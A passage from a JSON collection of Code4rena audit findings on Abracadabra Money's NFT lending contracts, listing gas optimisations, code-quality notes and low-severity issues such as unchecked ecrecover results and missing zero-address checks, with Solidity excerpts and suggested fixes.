      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23028",
      "title": "[N-07] Interfaces should be moved to separate files",
      "impact": "LOW",
      "content": "\nMost of the other interfaces in this project are in their own file in the interfaces directory. The interfaces below do not follow this pattern\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #1\n\n47  interface ILendingClub {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L47>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n54  interface INFTPair {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L54>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n37  interface ILendingClub {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L37>\n\n```solidity\nFile: contracts/NFTPair.sol   #4\n\n44  interface INFTPair {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L44>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23027",
      "title": "[N-06] `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
      "content": "\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n181       function updateLoanParams(uint256 tokenId, TokenLoanParams memory params) public {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L181>\n\n```solidity\nFile: contracts/NFTPair.sol   #2\n\n713       function withdrawFees() public {\n714           address to = masterContract.feeTo();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L713-L714>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n728       function setFeeTo(address newFeeTo) public onlyOwner {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L728>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #4\n\n198       function updateLoanParams(uint256 tokenId, TokenLoanParams memory params) public {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L198>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #5\n\n735       function withdrawFees() public {\n736           address to = masterContract.feeTo();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L735-L736>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #6\n\n750       function setFeeTo(address newFeeTo) public onlyOwner {\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L750>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23026",
      "title": "[N-05] `require()`/`revert()` statements should have descriptive reason strings",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n501               revert();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L501>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n534               revert();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L534>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23025",
      "title": "[N-04] Calls to `BoringMath.to128()` are redundant",
      "impact": "LOW",
      "content": "\nAll calls to `to128()` occur on the result of `calculateInterest()`, which itself already checks that the value fits into a `uint128`\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #1\n\n285                  ).to128();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L285>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n552          uint256 interest = calculateInterest(principal, uint64(block.timestamp - loan.startTime), loanParams.annualInterestBPS).to128();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L552>\n\n```solidity\nFile: contracts/NFTPair.sol   #3\n\n519          uint256 interest = calculateInterest(principal, uint64(block.timestamp - loan.startTime), loanParams.annualInterestBPS).to128();\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L519>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23024",
      "title": "[N-03] Some compilers can't handle two different contracts with the same name",
      "impact": "LOW",
      "content": "\nSome [compilers](https://github.com/trufflesuite/truffle/issues/2147) only compile the first one they encounter, ignoring the second one. If two contracts are different (e.g. different struct argument definitions) then they should have different names\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n37  interface ILendingClub {\n38      // Per token settings.\n39      function willLend(uint256 tokenId, TokenLoanParams memory params) external view returns (bool);\n40  \n41      function lendingConditions(address nftPair, uint256 tokenId) external view returns (TokenLoanParams memory);\n42  }\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L37-L42>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n47  interface ILendingClub {\n48      // Per token settings.\n49      function willLend(uint256 tokenId, TokenLoanParams memory params) external view returns (bool);\n50  \n51      function lendingConditions(address nftPair, uint256 tokenId) external view returns (TokenLoanParams memory);\n52  }\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L47-L52>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23023",
      "title": "[N-02] Contracts should be refactored to extend a base contract with the common functionality",
      "impact": "LOW",
      "content": "\n    $ fgrep -xf NFTPair.sol NFTPairWithOracle.sol | wc -l\n    686\n    $ wc -l NFTPair.sol NFTPairWithOracle.sol\n    732 NFTPair.sol\n    754 NFTPairWithOracle.sol\n\n<!---->\n\n    686 / 732 = 93.7%\n    686 / 754 = 91.0%\n\nAbout 92% of the lines in each file are exactly the same as the lines in the other file. At the very least the shared constants, the common state variables, and the pure functions should be moved to a common base contract.\n\n```solidity\nFile: contracts/NFTPair.sol (various lines)   #1\n\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol (various lines)   #2\n\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23022",
      "title": "[N-01] Consider supporting CryptoPunks and EtherRocks",
      "impact": "LOW",
      "content": "\nThe project `README.md` says that `NFTPair`s are specifically ERC721 tokens, but not all NFTs are ERC721s. CryptoPunks and EtherRocks came before the standard and do not conform to it.\n\n```solidity\nFile: README.md   #1\n\n58  - NFT Pair are a version of Cauldrons where the collateral isn't an ERC20 token but an ERC721 token, the deal OTC, the parameters of the loan themselves pre-defined.\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/README.md?plain=1#L58>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5396",
      "title": "[G-09] `_lend()`: Copying in memory can be more expensive than using the `storage` keyword",
      "impact": "GAS",
      "content": "\nIn this function, I suggest replacing `TokenLoan memory loan = tokenLoan[tokenId];` with `TokenLoan storage loan = tokenLoan[tokenId];`. Only 2 SLOADs are made (`loan.status` and `loan.borrower`) and the function is writing in memory (`loan` variable) before writing in storage. These steps are superfluous and there's no value from a copy in memory here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-09-_lend-copying-in-memory-can-be-more-expensive-than-using-the-storage-keyword",
      "tags": [],
      "finders": []
    },
    {
      "id": "5395",
      "title": "[G-08] `updateLoanParams()`: Copying in memory can be more expensive than using the `storage` keyword",
      "impact": "GAS",
      "content": "\nThis is valid in both files `NFTPair.sol` and `NFTPairWithOracle.sol`.\nIn this particular case here, I suggest using the `storage` keyword instead of the `memory` one, as the copy in memory is wasting some MSTOREs and MLOADs. See the `@audit` tags for more details:\n\n```solidity\n    function updateLoanParams(uint256 tokenId, TokenLoanParams memory params) public {\n        TokenLoan memory loan = tokenLoan[tokenId]; //@audit gas: use the storage keyword instead and only cache loan.status\n        if (loan.status == LOAN_OUTSTANDING) {\n            // The lender can change terms so long as the changes are strictly\n            // the same or better for the borrower:\n            require(msg.sender == loan.lender, \"NFTPair: not the lender\");\n            TokenLoanParams memory cur = tokenLoanParams[tokenId];  //@audit gas: copying in memory is actually more expensive in this use-case than using storage\n            require(\n                params.duration >= cur.duration &&\n                    params.valuation <= cur.valuation &&\n                    params.annualInterestBPS <= cur.annualInterestBPS &&\n                    params.ltvBPS <= cur.ltvBPS,\n                \"NFTPair: worse params\"\n            );\n        } else if (loan.status == LOAN_REQUESTED) {\n            // The borrower has already deposited the collateral and can\n            // change whatever they like\n            require(msg.sender == loan.borrower, \"NFTPair: not the borrower\");\n        } else {\n          (...)\n```\n\nI suggest:\n\n*   Using `TokenLoan storage loan = tokenLoan[tokenId];`\n*   Only caching `loan.status` in memory as it can be evaluated twice (in the if/else statement)\n*   Using `TokenLoanParams storage cur = tokenLoanParams[tokenId];`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-08-updateloanparams-copying-in-memory-can-be-more-expensive-than-using-the-storage-keyword",
      "tags": [],
      "finders": []
    },
    {
      "id": "5394",
      "title": "[G-07] `updateLoanParams()`: Replace `memory` with `calldata` and `public` with `external`",
      "impact": "GAS",
      "content": "\nThis is valid in both files `NFTPair.sol` and `NFTPairWithOracle.sol`.\nAs mentioned above, `updateLoanParams()` should be external. Furthermore, `TokenLoanParams memory params` should be `TokenLoanParams calldata params`.\nTherefore, we'd go from:\n\n```solidity\nfunction updateLoanParams(uint256 tokenId, TokenLoanParams memory params) public\n```\n\nto\n\n```solidity\nfunction updateLoanParams(uint256 tokenId, TokenLoanParams calldata params) external\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-07-updateloanparams-replace-memory-with-calldata-and-public-with-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "5393",
      "title": "[G-05] `++i` costs less gas compared to `i++` or `i += 1`",
      "impact": "GAS",
      "content": "\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n\n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n\nBut `++i` returns the actual incremented value:\n\n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`\n\nInstances include:\n\n```solidity\nNFTPair.sol:494:        for (uint256 k = 2; k <= COMPOUND_INTEREST_TERMS; k++) {\nNFTPair.sol:641:        for (uint256 i = 0; i < actions.length; i++) {\nNFTPairWithOracle.sol:527:        for (uint256 k = 2; k <= COMPOUND_INTEREST_TERMS; k++) {\nNFTPairWithOracle.sol:674:        for (uint256 i = 0; i < actions.length; i++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-05-i-costs-less-gas-compared-to-i-or-i--1",
      "tags": [],
      "finders": []
    },
    {
      "id": "5392",
      "title": "[G-01] `NFTPair.init` and `NFTPairWithOracle.init`: Storage usage optimization",
      "impact": "GAS",
      "content": "\nI suggest replacing:\n\n```solidity\n175:     function init(bytes calldata data) public payable override {\n176:         require(address(collateral) == address(0), \"NFTPair: already initialized\");\n177:         (collateral, asset) = abi.decode(data, (IERC721, IERC20));\n178:         require(address(collateral) != address(0), \"NFTPair: bad pair\"); //@audit could save 1 SLOAD here + refund 2 SSTOREs on revert\n179:     }\n```\n\nwith:\n\n```solidity\nfunction init(bytes calldata data) public payable override {\n    require(address(collateral) == address(0), \"NFTPair: already initialized\");\n    (address _collateral, address _asset) = abi.decode(data, (IERC721, IERC20));\n    require(address(_collateral) != address(0), \"NFTPair: bad pair\");\n    (collateral, asset) = (_collateral, _asset);\n}\n```\n\nHere, we're saving 1 SLOAD at the cost of 2 MSTOREs and 3 MLOADs => around 85 gas.\nFurthermore, in case of revert, a lot more gas would be refunded, as the 2 SSTORE operations are done after the `require` statements.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-01-nftpairinit-and-nftpairwithoracleinit-storage-usage-optimization",
      "tags": [],
      "finders": []
    },
    {
      "id": "5391",
      "title": "[L-06] `ecrecover` not checked for zero result",
      "impact": "LOW",
      "content": "\nA return value of zero indicates an invalid signature, so this is both invalid state-handling and an incorrect message\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n383              require(ecrecover(_getDigest(dataHash), v, r, s) == lender, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L383>\n\n```solidity\nFile: contracts/NFTPair.sol   #2\n\n419          require(ecrecover(_getDigest(dataHash), v, r, s) == borrower, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L419>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #3\n\n417              require(ecrecover(_getDigest(dataHash), signature.v, signature.r, signature.s) == lender, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L417>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #4\n\n452          require(ecrecover(_getDigest(dataHash), signature.v, signature.r, signature.s) == borrower, \"NFTPair: signature invalid\");\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L452>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#l-06-ecrecover-not-checked-for-zero-result",
      "tags": [],
      "finders": []
    },
    {
      "id": "4567",
      "title": "[G-11] Reduce the size of error messages (Long revert Strings)",
      "impact": "GAS",
      "content": "\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\nNFTPair.sol:366:            require(ILendingClub(lender).willLend(tokenId, params), \"NFTPair: LendingClub does not like you\"); //@audit length == 38\nNFTPairWithOracle.sol:398:            require(ILendingClub(lender).willLend(tokenId, params), \"NFTPair: LendingClub does not like you\"); //@audit length == 38\n```\n\nI suggest shortening the revert strings to fit in 32 bytes, or using custom errors as described next.\n\n**[cryptolyndon (AbraNFT) commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/126#issuecomment-1126604522):**\n > Good report, thank you. Detailed, specific to the actual contract / project, more in depth than the usual drive-by checklists.\n\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-11-reduce-the-size-of-error-messages-long-revert-strings",
      "tags": [],
      "finders": []
    },
    {
      "id": "4566",
      "title": "[G-10] No need to explicitly initialize variables with default values",
      "impact": "GAS",
      "content": "\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n```solidity\nNFTPair.sol:96:    uint8 private constant LOAN_INITIAL = 0;\nNFTPair.sol:641:        for (uint256 i = 0; i < actions.length; i++) {\nNFTPairWithOracle.sol:113:    uint8 private constant LOAN_INITIAL = 0;\nNFTPairWithOracle.sol:674:        for (uint256 i = 0; i < actions.length; i++) {\n```\n\nI suggest removing explicit initializations for default values.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-10-no-need-to-explicitly-initialize-variables-with-default-values",
      "tags": [],
      "finders": []
    },
    {
      "id": "4562",
      "title": "[G-06] Public functions to external",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.\n\n```solidity\n    NFTPair.init(bytes) (contracts/NFTPair.sol#175-179)\n    NFTPairWithOracle.init(bytes) (contracts/NFTPairWithOracle.sol#192-196)\n    NFTPair.updateLoanParams(uint256,TokenLoanParams) (contracts/NFTPair.sol#181-203)\n    NFTPair.withdrawFees() (contracts/NFTPair.sol#713-723)\n    NFTPair.setFeeTo(address) (contracts/NFTPair.sol#728-731)\n    NFTPairWithOracle.updateLoanParams(uint256,TokenLoanParams) (contracts/NFTPairWithOracle.sol#198-223)\n    NFTPairWithOracle.withdrawFees() (contracts/NFTPairWithOracle.sol#735-745)\n    NFTPairWithOracle.setFeeTo(address) (contracts/NFTPairWithOracle.sol#750-753)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-06-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "4560",
      "title": "[G-04] An array's length should be cached to save gas in for-loops",
      "impact": "GAS",
      "content": "\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\nNFTPair.sol:641:        for (uint256 i = 0; i < actions.length; i++) {\nNFTPairWithOracle.sol:674:        for (uint256 i = 0; i < actions.length; i++) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-04-an-arrays-length-should-be-cached-to-save-gas-in-for-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "4559",
      "title": "[G-03] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nInstead of using the `&&` operator in a single require statement to check multiple conditions, I suggest using multiple require statements with 1 condition per require statement (saving 3 gas per `&`):\n\n```solidity\ncontracts/NFTPair.sol:\n  622:         require(callee != address(bentoBox) && callee != address(collateral) && callee != address(this), \"NFTPair: can't call\");\n\ncontracts/NFTPairWithOracle.sol:\n  655:         require(callee != address(bentoBox) && callee != address(collateral) && callee != address(this), \"NFTPair: can't call\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-03-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4558",
      "title": "[G-02] Caching storage values in memory",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, storage values should get cached in memory (see the `@audit` tags for further details):\n\n```solidity\ncontracts/NFTPair.sol:\n  290:         uint256 totalShare = bentoBox.toShare(asset, params.valuation, false); //@audit gas: asset SLOAD 1\n  297:                 bentoBox.balanceOf(asset, address(this)) >= (totalShare - openFeeShare + protocolFeeShare + feesEarnedShare),  //@audit gas: asset SLOAD 2\n  301:             bentoBox.transfer(asset, lender, address(this), totalShare - openFeeShare + protocolFeeShare);  //@audit gas: asset SLOAD 2\n  305:         bentoBox.transfer(asset, address(this), loan.borrower, borrowerShare);  //@audit gas: asset SLOAD 3\n  523:         uint256 totalShare = bentoBox.toShare(asset, amount, false); //@audit gas: asset SLOAD 1\n  524:         uint256 feeShare = bentoBox.toShare(asset, fee, false); //@audit gas: asset SLOAD 2\n  528:             require(bentoBox.balanceOf(asset, address(this)) >= (totalShare + feesEarnedShare), \"NFTPair: skim too much\");  //@audit gas: asset SLOAD 3\n  532:             bentoBox.transfer(asset, msg.sender, address(this), feeShare); //@audit gas: asset SLOAD 3\n  539:         bentoBox.transfer(asset, from, loan.lender, totalShare - feeShare); //@audit gas: asset SLOAD 4\n\ncontracts/NFTPairWithOracle.sol:\n  325:         uint256 totalShare = bentoBox.toShare(asset, params.valuation, false); //@audit gas: asset SLOAD 1\n  332:                 bentoBox.balanceOf(asset, address(this)) >= (totalShare - openFeeShare + protocolFeeShare + feesEarnedShare), //@audit gas: asset SLOAD 2\n  336:             bentoBox.transfer(asset, lender, address(this), totalShare - openFeeShare + protocolFeeShare); //@audit gas: asset SLOAD 2\n  340:         bentoBox.transfer(asset, address(this), loan.borrower, borrowerShare); //@audit gas: asset SLOAD 3\n  556:         uint256 totalShare = bentoBox.toShare(asset, amount, false); //@audit gas: asset SLOAD 1\n  557:         uint256 feeShare = bentoBox.toShare(asset, fee, false); //@audit gas: asset SLOAD 2\n  561:             require(bentoBox.balanceOf(asset, address(this)) >= (totalShare + feesEarnedShare), \"NFTPair: skim too much\"); //@audit gas: asset SLOAD 3\n  565:             bentoBox.transfer(asset, msg.sender, address(this), feeShare); //@audit gas: asset SLOAD 3\n  572:         bentoBox.transfer(asset, from, loan.lender, totalShare - feeShare); //@audit gas: asset SLOAD 4\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#g-02-caching-storage-values-in-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "4555",
      "title": "[L-05] Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n729           feeTo = newFeeTo;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L729>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n751           feeTo = newFeeTo;\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L751>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#l-05-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "4554",
      "title": "[L-04] Calls incorrectly allow non-zero `msg.value`",
      "impact": "LOW",
      "content": "\nThe comments below say that `msg.value` is \"only applicable to\" a subset of actions. All other actions should have a `require(!msg.value)`. Allowing it anyway is incorrect state handling\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n631      /// @param values A one-to-one mapped array to `actions`. ETH amounts to send along with the actions.\n632      /// Only applicable to `ACTION_CALL`, `ACTION_BENTO_DEPOSIT`.\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L631-L632>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n664      /// @param values A one-to-one mapped array to `actions`. ETH amounts to send along with the actions.\n665      /// Only applicable to `ACTION_CALL`, `ACTION_BENTO_DEPOSIT`.\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L664-L665>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#l-04-calls-incorrectly-allow-non-zero-msgvalue",
      "tags": [],
      "finders": []
    },
    {
      "id": "4553",
      "title": "[L-03] Incorrect comments",
      "impact": "LOW",
      "content": "\nSkimming involves excess balances in the *bentobox*, not in the contract itself. This comment will lead to clients incorrectly passing tokens to the pair, rather than the bentobox. In addition, overall, there should be more comments devited to the interactions with the bentobox\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n320      /// @param skim True if the funds have been transfered to the contract\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L320>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n355      /// @param skim True if the funds have been transfered to the contract\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L355>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "#l-03-incorrect-comments",
      "tags": [],
      "finders": []
    },
    {
      "id": "4552",
      "title": "[L-02] Pairs do not implement `ERC721TokenReceiver`",
      "impact": "LOW",
